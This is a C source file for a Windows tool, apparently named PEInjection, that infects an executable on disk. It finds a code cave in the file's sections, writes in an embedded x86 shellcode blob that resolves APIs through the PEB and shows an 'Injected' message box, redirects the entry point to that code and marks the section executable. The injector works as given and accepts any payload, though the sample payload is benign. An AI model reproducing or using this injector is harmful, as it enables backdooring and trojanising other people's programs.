#include <Windows.h>
#include <stdio.h>

LPVOID find_code_cave(LPBYTE section_base, DWORD section_size, DWORD code_size, DWORD min_cave_size)
{
	LPBYTE pAddress = section_base;
	DWORD cave_size = 0;

	for (DWORD j = 0; j < section_size; j++)
	{
		if (pAddress[j] == 0x00) 
		{
			cave_size++;

			if (cave_size >= code_size+ min_cave_size) 
			{
				return &pAddress[j - cave_size + 1];
			}
		}
		else
		{
			cave_size = 0;
		}
	}

	return NULL;
}
int main(int argc, char* argv[]) {
	wchar_t filename[200];
	if (argc == 1) {
		printf("Usage: PEInjection <filename>\n");
		return 0;
	}
	printf("%s\n", argv[1]);
	MultiByteToWideChar(
		CP_UTF8,
		MB_PRECOMPOSED,
		argv[1],
		-1,
		filename,
		200
	);

	printf("[+]\tLoading original file\n");
	HANDLE fileHandle = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE) {
		printf("[x] Invalid File\n");
		return -1;
	}

	DWORD fileSize = GetFileSize(fileHandle, NULL);
	HANDLE hFileMapping = CreateFileMapping(fileHandle, NULL, PAGE_READWRITE, 0, fileSize, NULL);
	if (hFileMapping == NULL)
	{
		CloseHandle(fileHandle);
		printf("\n[!]\tError: could not map file\n");
		return 1;
	}

	LPVOID pBase = MapViewOfFile(hFileMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, fileSize);
	if (pBase == NULL)
	{
		CloseHandle(hFileMapping);
		CloseHandle(fileHandle);
		printf("\n[!]\tError: could not get file view\n");
		return 1;
	}
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pBase;
	PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((LPBYTE)pBase + dos_header->e_lfanew);
	PIMAGE_SECTION_HEADER section_header = (PIMAGE_SECTION_HEADER)((LPBYTE)nt_headers + sizeof(IMAGE_NT_HEADERS));

	
		char* shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 800);


		CopyMemory(shellcode,
			"\xE8\x00\x00\x00\x00\x58\x2D\x05\x10\x40\x00\xEB\x2D\x55\x8B\xEC"
			"\x52\x53\x56\x57\x33\xC0\x8B\x74\x24\x18\x8B\x7C\x24\x1C\x8A\x06"
			"\x8A\x27\x84\xC0\x74\x0E\x84\xE4\x74\x0A\x2A\xC4\x32\xE4\x46\x47"
			"\x84\xC0\x74\xEA\x5F\x5E\x5B\x5A\x5D\xC3\x55\x8B\xEC\x81\xEC\x08"
			"\x02\x00\x00\x89\x84\x24\x04\x02\x00\x00\x64\xA1\x30\x00\x00\x00"
			"\x8B\x40\x0C\x8B\x40\x14\x8B\x00\x8B\x00\x8B\x40\x10\x89\x44\x24"
			"\x20\x8B\x5C\x24\x20\x33\xD2\x8A\x53\x3C\x83\xC3\x04\x03\xDA\x83"
			"\xC3\x14\x33\xD2\x66\x8B\x13\x89\x54\x24\x1C\x83\xC3\x18\x8B\x54"
			"\x24\x1C\x81\xFA\x0B\x01\x00\x00\x75\x05\x83\xC3\x48\xEB\x03\x83"
			"\xC3\x58\x8B\x03\x8B\x54\x24\x20\x03\xD0\x89\x54\x24\x18\x8B\x44"
			"\x24\x20\x8B\x5A\x1C\x03\xD8\x89\x5C\x24\x24\x8B\x5A\x24\x03\x5C"
			"\x24\x20\x8B\x52\x20\x03\xD0\x33\xC9\x8B\x44\x24\x20\x03\x02\x50"
			"\xB8\x00\x00\x00\x00\x89\x84\x24\x00\x02\x00\x00\xB8\x61\x72\x79"
			"\x41\x89\x84\x24\xFC\x01\x00\x00\xB8\x4C\x69\x62\x72\x89\x84\x24"
			"\xF8\x01\x00\x00\xB8\x4C\x6F\x61\x64\x89\x84\x24\xF4\x01\x00\x00"
			"\x8D\x84\x24\xF4\x01\x00\x00\x50\xE8\x10\xFF\xFF\xFF\x83\xC4\x08"
			"\x85\xC0\x75\x15\x41\x33\xC0\x66\x8B\x03\xC1\xE0\x02\x03\x44\x24"
			"\x24\x8B\x00\x89\x44\x24\x14\xEB\x5E\x8B\x44\x24\x20\x03\x02\x50"
			"\xB8\x73\x73\x00\x00\x89\x84\x24\x00\x02\x00\x00\xB8\x64\x64\x72"
			"\x65\x89\x84\x24\xFC\x01\x00\x00\xB8\x72\x6F\x63\x41\x89\x84\x24"
			"\xF8\x01\x00\x00\xB8\x47\x65\x74\x50\x89\x84\x24\xF4\x01\x00\x00"
			"\x8D\x84\x24\xF4\x01\x00\x00\x50\xE8\xB0\xFE\xFF\xFF\x83\xC4\x08"
			"\x85\xC0\x75\x13\x41\x33\xC0\x66\x8B\x03\xC1\xE0\x02\x03\x44\x24"
			"\x24\x8B\x00\x89\x44\x24\x10\x83\xC2\x04\x83\xC3\x02\x83\xF9\x02"
			"\x0F\x85\x33\xFF\xFF\xFF\x8B\x5C\x24\x14\x03\x5C\x24\x20\xB8\x6C"
			"\x6C\x00\x00\x89\x84\x24\x00\x02\x00\x00\xB8\x33\x32\x2E\x64\x89"
			"\x84\x24\xFC\x01\x00\x00\xB8\x55\x73\x65\x72\x89\x84\x24\xF8\x01"
			"\x00\x00\x8D\x84\x24\xF8\x01\x00\x00\x50\xFF\xD3\x89\x44\x24\x08"
			"\x8B\x5C\x24\x10\x03\x5C\x24\x20\xB8\x6F\x78\x41\x00\x89\x84\x24"
			"\x00\x02\x00\x00\xB8\x61\x67\x65\x42\x89\x84\x24\xFC\x01\x00\x00"
			"\xB8\x4D\x65\x73\x73\x89\x84\x24\xF8\x01\x00\x00\x8D\x84\x24\xF8"
			"\x01\x00\x00\x50\x8B\x44\x24\x0C\x50\xFF\xD3\x89\x44\x24\x04\x8B"
			"\x5C\x24\x04\x33\xC0\x50\xB8\x69\x6F\x6E\x00\x89\x84\x24\x00\x02"
			"\x00\x00\xB8\x43\x61\x70\x74\x89\x84\x24\xFC\x01\x00\x00\x8D\x84"
			"\x24\xFC\x01\x00\x00\x50\xB8\x64\x64\x00\x00\x89\x84\x24\xF4\x01"
			"\x00\x00\xB8\x63\x74\x65\x64\x89\x84\x24\xF0\x01\x00\x00\xB8\x49"
			"\x6E\x6A\x65\x89\x84\x24\xEC\x01\x00\x00\x8D\x84\x24\xEC\x01\x00"
			"\x00\x50\x33\xC0\x50\xFF\xD3\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C"
			"\x8B\x40\x14\x8B\x40\x10\x89\x84\x24\x08\x02\x00\x00\x05", 622);
		CopyMemory(shellcode + 622, &nt_headers->OptionalHeader.AddressOfEntryPoint, 4);
		CopyMemory(shellcode + 626, "\xff\xe0", 2);
		
		for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
			LPBYTE section_base = (LPBYTE)pBase + section_header->VirtualAddress;
			DWORD section_size = section_header->SizeOfRawData;
			DWORD code_size = 628;
			DWORD min_cave_size = code_size + 1;
			LPVOID pCave = find_code_cave(section_base, section_size,code_size, min_cave_size);
			
			if (pCave != nullptr) {
				printf("\ncode cave: %#p", pCave);
				printf("\nSection name: %s", section_header->Name);
				LPBYTE secB = (LPBYTE)pBase + section_header->PointerToRawData;
				DWORD target = (DWORD)pCave - (DWORD)secB;
				DWORD newEntryPoint = section_header->VirtualAddress + target;
				printf("\nVir section base: %#p",secB);
				
				printf("\n newEntrypoint: %#p", newEntryPoint);

				nt_headers->OptionalHeader.AddressOfEntryPoint = newEntryPoint;
				section_header->Characteristics= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
				memcpy(pCave, shellcode, 628);

				DWORD bytesWritten = 0;

				SetFilePointer(fileHandle, 0, NULL, FILE_BEGIN);
				WriteFile(fileHandle, pBase, fileSize, &bytesWritten, NULL);
				CloseHandle(fileHandle);
				return 0;
			}
			
			section_header++;
		}
		printf("\nkhong tim thay code cave");
		CloseHandle(fileHandle);
		return 0;
	}
